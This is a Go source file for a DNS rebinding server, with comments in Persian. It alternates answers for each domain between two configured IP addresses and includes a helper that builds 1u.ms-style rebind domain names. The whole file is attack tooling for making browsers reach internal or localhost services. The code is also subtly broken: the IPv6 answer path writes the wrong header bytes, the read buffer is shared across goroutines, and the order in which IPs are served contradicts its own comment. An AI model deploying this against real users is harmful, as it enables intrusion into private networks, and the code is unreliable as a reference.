package dnsrebind

import (
	"fmt"
	"net"
	"strings"
	"sync"
)

type Server struct {
	Port     int
	IPs      []string
	server   *net.UDPConn
	mu       sync.Mutex
	requests map[string]int
}

type DNSQuery struct {
	Domain string
	Type   uint16
}

func NewServer(port int, ips []string) (*Server, error) {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%d", port))
	if err != nil {
		return nil, err
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return nil, err
	}
	return &Server{
		Port:     port,
		IPs:      ips,
		server:   conn,
		requests: make(map[string]int),
	}, nil
}

func (s *Server) Start() {
	fmt.Printf(" [DNS] Server listening on :%d\n", s.Port)
	buf := make([]byte, 512)
	for {
		n, addr, err := s.server.ReadFromUDP(buf)
		if err != nil {
			return
		}
		go s.handleQuery(buf[:n], addr)
	}
}

func (s *Server) Stop() {
	if s.server != nil {
		s.server.Close()
	}
}

func (s *Server) handleQuery(data []byte, addr *net.UDPAddr) {
	if len(data) < 12 {
		return
	}

	// Parse domain
	domain := parseDomain(data[12:])
	if domain == "" {
		return
	}

	s.mu.Lock()
	s.requests[domain]++
	count := s.requests[domain]
	s.mu.Unlock()

	// Rebind: اول IP اول، بعد IP دوم
	var ip string
	if count%2 == 0 {
		ip = s.IPs[0]
	} else {
		if len(s.IPs) > 1 {
			ip = s.IPs[1]
		} else {
			ip = s.IPs[0]
		}
	}

	// ساخت پاسخ DNS
	response := buildDNSResponse(data, ip)
	s.server.WriteToUDP(response, addr)
}

func parseDomain(data []byte) string {
	var domain strings.Builder
	i := 0
	for i < len(data) {
		length := int(data[i])
		if length == 0 {
			break
		}
		i++
		if i+length > len(data) {
			break
		}
		domain.Write(data[i : i+length])
		domain.WriteString(".")
		i += length
	}
	return strings.TrimSuffix(domain.String(), ".")
}

func buildDNSResponse(query []byte, ip string) []byte {
	resp := make([]byte, len(query))
	copy(resp, query)

	// Set response flag
	resp[2] = 0x81
	resp[3] = 0x80

	// Answer count
	resp[6] = 0x00
	resp[7] = 0x01

	// Pointer to question
	answer := []byte{
		0xc0, 0x0c, // pointer
		0x00, 0x01, // type A
		0x00, 0x01, // class IN
		0x00, 0x00, 0x00, 0x3c, // TTL 60s
		0x00, 0x04, // length
	}

	parsedIP := net.ParseIP(ip).To4()
	if parsedIP == nil {
		// IPv6
		parsedIP = net.ParseIP(ip).To16()
		answer[8] = 0x00
		answer[9] = 0x10
		answer = append(answer[:8], answer[8:]...)
		answer = append(answer, parsedIP...)
	} else {
		answer = append(answer, parsedIP...)
	}

	resp = append(resp, answer...)
	return resp
}

// برای استفاده از nip.io و سرویس‌های مشابه
func RebindDomain(first, second string) string {
	// make-first-rebind-second.1u.ms format
	first = strings.ReplaceAll(first, ".", "-")
	second = strings.ReplaceAll(second, ".", "-")
	return fmt.Sprintf("make-%s-rebind-%s.1u.ms", first, second)
}
